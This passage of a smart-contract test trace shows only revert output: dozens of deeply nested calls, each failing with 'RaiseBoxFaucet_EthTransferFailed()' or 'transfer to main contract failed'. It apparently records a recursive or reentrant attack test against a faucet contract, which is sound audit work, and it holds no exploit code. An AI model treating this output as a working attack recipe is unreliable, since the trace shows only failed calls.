    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
